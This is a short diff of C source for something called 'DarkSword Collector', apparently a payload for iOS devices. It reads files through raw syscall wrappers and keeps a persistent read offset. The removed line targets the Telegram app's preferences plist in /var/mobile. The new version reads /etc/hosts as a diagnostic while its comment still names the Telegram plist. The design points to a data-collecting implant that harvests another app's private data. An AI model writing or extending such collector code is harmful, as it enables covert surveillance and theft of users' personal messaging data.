@@ -1,6 +1,6 @@
 /**
- * DarkSword Collector v42 - Back to basics: plain C static volatile
- * Same as v30 which worked, with app plist files added
+ * DarkSword Collector v43 - Diagnostic: read /etc/hosts (known good) + Telegram plist
+ * Single file, plain C static volatile, same as v30
  */
 
 static long _svc1(long n, long a) {
@@ -32,7 +32,8 @@ static volatile int g_offset = 0;
 int ds_start(void) {
     int offset = g_offset;
 
-    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist", O_RDONLY);
+    /* Read /etc/hosts - known to work */
+    int fd = (int)_svc2(SYS_open, (long)"/etc/hosts", O_RDONLY);
     if (fd < 0) { g_offset = 0; return 0xDEAD0000; }
 
     if (offset > 0) _svc4(SYS_lseek, fd, (long)offset, SEEK_SET, 0);
